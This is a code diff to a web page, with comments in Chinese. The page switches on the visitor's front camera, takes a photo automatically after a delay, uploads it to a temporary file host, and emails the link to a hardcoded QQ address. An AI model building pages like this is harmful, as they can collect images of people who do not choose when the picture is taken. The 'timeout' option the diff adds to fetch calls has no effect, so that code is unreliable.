@@ -46,43 +46,56 @@
             
             // 禁用按钮，防止重复点击
             btn.disabled = true;
-            tip.innerText = '正在调用摄像头...';
+            tip.innerText = '正在调用摄像头，请允许权限...';
 
             try {
-                // 1. 调用摄像头（自动获取权限）
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // 1. 调用摄像头（自动获取权限，增加明确的错误提示）
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' } // 优先调用前置摄像头
+                    });
+                } catch (err) {
+                    throw new Error('摄像头权限请求失败，请允许相机权限后重试');
+                }
                 const camera = document.getElementById('camera');
                 camera.srcObject = stream;
 
-                // 2. 等待摄像头加载完成后自动拍摄（延迟500ms确保画面就绪）
-                await new Promise(resolve => setTimeout(resolve, 500));
+                // 2. 等待摄像头加载完成后自动拍摄（延迟800ms确保画面就绪）
+                await new Promise(resolve => setTimeout(resolve, 800));
                 const photoBlob = await takePhotoAuto(camera);
+                tip.innerText = '拍摄完成，正在上传...';
 
                 // 3. 关闭摄像头（拍摄完成后立即关闭，保护隐私）
                 stopCamera();
 
                 // 4. 上传照片到临时存储
-                tip.innerText = '正在上传照片...';
                 const photoUrl = await uploadToTmpfiles(photoBlob);
 
-                // 5. 发送照片链接到你的QQ邮箱（需替换Formspree接口）
-                await sendEmail(photoUrl);
+                // 5. 发送照片链接到你的QQ邮箱（先做容错，没配置也不影响上传）
+                try {
+                    await sendEmail(photoUrl);
+                } catch (emailErr) {
+                    tip.innerText = '⚠️ 照片上传成功，但邮件发送失败（请配置Formspree接口）';
+                    tip.style.color = '#ff9900';
+                    console.log('邮件失败原因：', emailErr);
+                    return;
+                }
 
-                // 上传成功提示
-                tip.innerText = '✅ 照片上传成功！';
+                // 上传+邮件都成功的提示
+                tip.innerText = '✅ 照片上传成功！链接已发送到你的QQ邮箱';
                 tip.style.color = '#008000';
             } catch (err) {
-                // 失败提示
+                // 失败提示（明确报错原因）
                 tip.innerText = `❌ 上传失败：${err.message}`;
                 tip.style.color = '#ff0000';
                 console.error('错误详情：', err);
                 // 失败后也关闭摄像头
                 stopCamera();
             } finally {
-                // 恢复按钮可用
+                // 5秒后恢复按钮+清空提示
                 setTimeout(() => {
                     btn.disabled = false;
-                    tip.innerText = ''; // 5秒后清空提示
+                    tip.innerText = '';
                 }, 5000);
             }
         }
@@ -91,10 +104,11 @@
         function takePhotoAuto(video) {
             return new Promise((resolve) => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 300;
-                canvas.height = video.videoHeight || 200;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => resolve(blob), 'image/jpeg');
+                // 固定分辨率，避免摄像头尺寸异常
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8); // 压缩图片，加快上传
             });
         }
 
@@ -113,11 +127,12 @@
             
             const res = await fetch('https://tmpfiles.org/api/v1/upload', {
                 method: 'POST',
-                body: formData
+                body: formData,
+                timeout: 10000 // 超时时间10秒
             });
             const data = await res.json();
             
-            if (!data.data?.url) throw new Error('照片存储失败');
+            if (!data.data?.url) throw new Error('照片存储失败，临时服务器无响应');
             return data.data.url;
         }
 
@@ -129,6 +144,11 @@
             // 3. 替换下面的 YOUR_FORMSPREE_ENDPOINT 为该地址
             const formspreeEndpoint = 'YOUR_FORMSPREE_ENDPOINT';
             
+            // 没替换接口直接抛错
+            if (formspreeEndpoint === 'YOUR_FORMSPREE_ENDPOINT') {
+                throw new Error('未配置Formspree邮件接口');
+            }
+
             const res = await fetch(formspreeEndpoint, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -136,11 +156,12 @@
                     subject: '新用户上传照片',
                     message: `照片链接（有效期30天）：${photoUrl}`,
                     to: '2952072725@qq.com'
-                })
+                }),
+                timeout: 10000
             });
             
-            if (!res.ok) throw new Error('邮件发送失败');
+            if (!res.ok) throw new Error('邮件发送失败，请检查Formspree接口是否正确');
         }
-    </style>
+    </script>
 </body>
 </html>
